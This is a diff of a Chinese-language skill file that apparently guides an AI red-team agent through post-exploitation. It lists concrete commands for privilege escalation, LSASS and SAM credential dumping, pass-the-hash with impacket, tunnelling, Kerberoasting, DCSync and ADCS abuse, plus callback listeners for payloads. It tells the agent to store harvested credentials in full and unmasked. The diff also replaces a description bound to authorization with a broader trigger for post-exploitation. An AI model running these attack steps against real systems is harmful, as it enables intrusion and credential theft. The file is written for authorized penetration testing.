@@ -1,77 +1,91 @@
 ---
 name: redteam-ops
-description: 在明确授权的安全测试中，worker 已获得初始访问、需要记录后续验证步骤与证据时按需读取；所有动作服从任务范围、审批及操作约束，不因技能内容扩大授权。
+description: 拿到初始访问或一个可用凭据后做后渗透时调用——提权、凭据收集、横向移动、域内专项、隧道与数据获取，以及每一步的证据与边界纪律。当 worker 意图涉及「后渗透/提权/横移/域/内网」时使用。
+tags:
+  cwe: [CWE-269, CWE-522, CWE-250, CWE-732]
+  attack: [TA0004, TA0008, TA0006, TA0005, TA0010]
+  class: [post-exploitation, privilege-escalation, lateral-movement, credential-access]
 ---
 
 # 红队后渗透方法论
 
 ## 边界与禁止
 
-- 仅在授权范围内操作，遵守【操作约束】；
-- 不得破坏目标系统可用性，不得删除/篡改业务数据；
-- 敏感数据点到为止（证明可获取即可），不批量导出、不留存、不外传；
-- 所有操作必须留证（截图/命令输出/流量 ID）。
+- 仅在授权范围内操作，遵守【操作约束】；单步最小验证，不批量、不破坏。
+- 不删除/篡改业务数据；敏感数据点到为止（证明可访问即可），不批量导出、不留存、不外传。
+- 权限维持只做「演示可行」（落一条 fact 说明手法与条件），**不实际部署**长期后门。
+- 所有操作必须留证（截图/命令输出/流量 ID），凭据与令牌**全文**写入 fact（不缩写、不掩码——这是后续横向的弹药）。
 
 ## 阶段 0：落地稳定化
 
-拿到初始访问后先稳定立足点，避免掉线后重复工作：
+1. 确认身份与权限：`whoami / id`、`whoami /priv`（Windows）、`hostname`。
+2. 确认网络位置：`ip addr` / `ifconfig` / `route print`，标注可达内网段（哪些网段值得横向）。
+3. 摸清防御面：是否有 EDR/杀软（`ps aux | grep -i defend`、Windows Defender 事件）、出口是否受限。
+4. **先落一条 fact** 记录「初始访问点 + 身份 + 可达网段」——后续意图靠它接续。
 
-1. 确认当前身份（whoami / id / hostname）与权限等级；
-2. 确认网络位置（ip addr / ifconfig / ipconfig），标注内网段与可达网段；
-3. 检查现有持久化（计划任务、服务、启动项），如需添加按任务约束执行；
-4. 把获取的凭据/令牌/密钥**全文**（不缩写、不掩码）写入 fact（凭据是后续横向的弹药）。
+## 阶段 1：提权
 
-## 阶段 1：信息收集与提权
+### Linux 速查
+- `sudo -l`（GTFOBins 对照）；`id` 是否在 docker/lxd/disk 组；
+- SUID：`find / -perm -4000 -type f 2>/dev/null`（对照 GTFOBins）；
+- 定时任务：`cat /etc/crontab`、`ls -la /etc/cron.d/`、`crontab -l`（可写脚本 = 提权）；
+- 可写服务配置：`systemctl list-units --type=service` + `ls -la /etc/systemd/system/`；
+- 内核/发行版版本 → `search_vulns` 查本地提权 CVE（先 `uname -a`、`cat /etc/os-release`）；
+- 环境与历史：`env`、`~/.bash_history`、`~/.ssh/`、`/etc/passwd` 可写性；
+- 计划用 linpeas/pspy（宿主工具已装）：`linpeas.sh` 输出保存为证据文件。
 
-### Linux
-- `sudo -l` 检查 sudo 权限（GTFOBins 查利用方式）；
-- SUID/SGID 文件：`find / -perm -4000 -type f 2>/dev/null`；
-- 定时任务：`cat /etc/crontab` + `ls -la /etc/cron.d/` + 用户 crontab；
-- 内核版本：`uname -a` → search_vulns 查已知提权 CVE；
-- 环境变量：`env | grep -i pass\|token\|key\|secret`；
-- SSH 密钥：`find / -name "id_rsa" 2>/dev/null`、`cat ~/.ssh/authorized_keys`；
-- 历史命令：`cat ~/.bash_history`（往往包含其他凭据或内网信息）。
+### Windows 速查
+- `whoami /priv`：SeImpersonate/SeAssignPrimaryToken → Potato 系；SeDebug → 注入 LSASS；
+- `whoami /groups`：是否本地管理员/域组；
+- 未加引号服务路径：`wmic service get name,pathname,startmode | findstr /i "auto"`；
+- 计划任务与服务权限：`schtasks /query /fo LIST /v`、`accesschk.exe`；
+- 存储凭据：`cmdkey /list`、浏览器配置、`Get-ChildItem -Recurse -Force $env:APPDATA`；
+- 全面体检用 winPEAS（宿主工具）。
 
-### Windows
-- 当前用户权限：`whoami /priv`（关注 SeImpersonate/SeDebug/SeBackup）；
-- 域信息：`whoami /groups`（是否 Domain Admins/Enterprise Admins）；
-- 存储的凭据：`cmdkey /list`、PowerShell `Get-StoredCredential`；
-- 计划任务：`schtasks /query /fo LIST`；
-- 服务：`wmic service get name,pathname,startmode`（查找 unquoted path）;
-- 始终用 `winPEAS` 或 `PowerUp.ps1` 做全面检查（宿主工具已装）。
+## 阶段 2：凭据收集
 
-## 阶段 2：横向移动
+- Linux：`/etc/shadow`（可读时）、应用配置（.env / config.php / application.yml / settings.py）、
+  SSH 私钥、数据库连接串、云元数据（见 cloud 技能）、CI/CD token；
+- Windows：LSASS dump（需权限）、SAM/SYSTEM、DPAPI、组策略首选项 GPP；
+- 每得到一组凭据：**立即 fact 落库**（用户名/口令或 hash/来源主机/适用服务），并 `auth_request`
+  组装验证请求（HTTP 侧）或 `netexec`/`smbclient` 验证（SMB 侧）；
+- **不要凭号**：判断锁定策略前最多 2-3 次尝试；域账号喷之前先查 `net accounts`。
 
-1. **凭据复用优先**：拿到凭据后先试 SSH/SMB/RDP/WinRM 到已知内网 IP；
-2. **pass-the-hash/pass-the-ticket**：impacket 工具族（psexec.py/wmiexec.py/secretsdump.py）；
-3. **端口转发/隧道**：ligolo-ng（TUN 方式）或 socat（端口转发）；
-4. **扫描内网**：已知网段内 `nmap -sV --top-ports 100` 或 `crackmapexec smb <网段>/24`；
-5. **凭据喷射**：对发现的服务用收集到的凭据逐个尝试（限制并发避免锁号）。
+## 阶段 3：横向移动
 
-## 阶段 3：数据获取
-
-- 数据库凭据：从配置文件（.env/config.php/web.config/application.yml）提取；
-- 数据库交互：mysql/psql/mssql 客户端连接，**只做 SELECT**（读证明数据即可）；
-- 文件下载：目标系统的导出/下载接口（Excel/PDF/JSON）；
-- 关键标识：用户表含身份证号/手机号、财务表含金额/交易记录、配置文件含 API 密钥。
+1. 用已有凭据直连：SSH/RDP/SMB/WinRM/数据库（先 `nmap -sV -p 22,445,3389,5985,1433` 确认开放面）；
+2. impacket：`psexec.py` / `wmiexec.py` / `smbexec.py` / `secretsdump.py`（已含命令包装器）；
+3. Pass-the-hash / Pass-the-ticket：`impacket-wmiexec -hashes :<NTLM> user@host`；
+4. 隧道：`chisel`（HTTP 隧道）、`ligolo-ng`（TUN）、`ssh -D`（socks5）；优先选择目标出网允许的形态；
+5. 横向扫描收敛：只打已证明归属的网段，`nmap -sT --top-ports 100 -iL ips.txt`；
+6. 每跳记录 provenance：从哪台、用什么凭据、到哪台——事实链缺一环，报告就不可信。
 
 ## 阶段 4：Windows 域环境专项
 
-- **信息枚举**：`Get-ADUser`/`Get-ADComputer`/`Get-ADGroup`（PowerShell ActiveDirectory 模块）；
-- **Kerberoasting**：`GetUserSPNs.py domain/user:pass -dc-ip <DC>` → hashcat 破解；
-- **AS-REP Roasting**：`GetNPUsers.py domain/ -usersfile users.txt -no-pass`；
-- **DCSync**：`secretsdump.py domain/admin:pass@dc-ip`（需域管理员权限）；
-- **BloodHound**：SharpHound.exe 采集 → BloodHound 分析攻击路径（宿主需安装）；
-- **GPP 密码**：`gpp-decrypt` 解析 SYSVOL 中的组策略 XML。
+- 枚举：`net user /domain`、`net group "Domain Admins" /domain`、`Get-ADUser -Filter *`；
+- Kerberoasting：`impacket-GetUserSPNs domain/user:pass -dc-ip <DC> -request` → hashcat -m 13100；
+- AS-REP：`impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -format hashcat`；
+- DCSync：`impacket-secretsdump domain/admin:pass@dc`（需 Replicating Directory Changes 权限）；
+- ADCS：`certipy find -u user@domain -p pass -dc-ip dc`（ESC1-ESC8 模板误配）；
+- 委派：`impacket-findDelegation`；
+- 攻击路径可视化可选 BloodHound（SharpHound 采集 → 分析），把关键路径写进 fact。
 
-## 阶段 5：权限维持与清理
+## 阶段 5：数据获取与目标达成
 
-- 测试环境的权限维持仅限 demonstration（写一条 fact 证明"可以做到"即可，不实际部署）；
-- 清理测试痕迹：删除上传的脚本/工具文件、还原修改过的配置、关闭创建的监听器。
+- 先明确「证明什么」：后台权限/某类数据可读/某接口可控——用最小读取证明，不拖库；
+- 数据库只读证明：`SELECT ... LIMIT 1`；文件只取一条样本；
+- 每次数据读取都要 `save_evidence` 并对 source_url/文件名负责；
+- 内网横向拿到的**新服务/新资产登记进资产库**（`insert_assets` / `add_task_scope`），
+  未测资产用 `list_untested_assets` 规划下一步。
 
-## 证据纪律
+## 回连与 C2（平台内建，别手搭）
 
-- **每个阶段都要 save_evidence**（截图或命令输出）；
-- **凭据全文写进 fact**（不缩写不掩码）；
-- **每步标注 confidence**：observed（直接看到）vs inferred（推断）；
-- **流量 ID 引用**：HTTP 操作用 traffic_search 查 ID 并绑定到 finding。
+- `listener_start` 起监听，返回解析后的回连地址；payload 直接用返回地址生成；
+- 回连落在 `listener_sessions`，逐会话留证；**不要**自建公网 C2；
+- 出口形态按平台 C2 配置（direct / SSH 中继 / manual），不自作主张开公网端口。
+
+## 证据与失败处理
+
+- 失败也要落 fact（「测了 X，无 Y」），避免重复尝试与报告里重复叙述；
+- 提权/横移尝试被拦（EDR/WAF/策略）→ 记录拦截形态与前置条件，不要反复硬打；
+- confidence：直接看到=observed，推断=inferred；推断不能升格为 finding 证据。
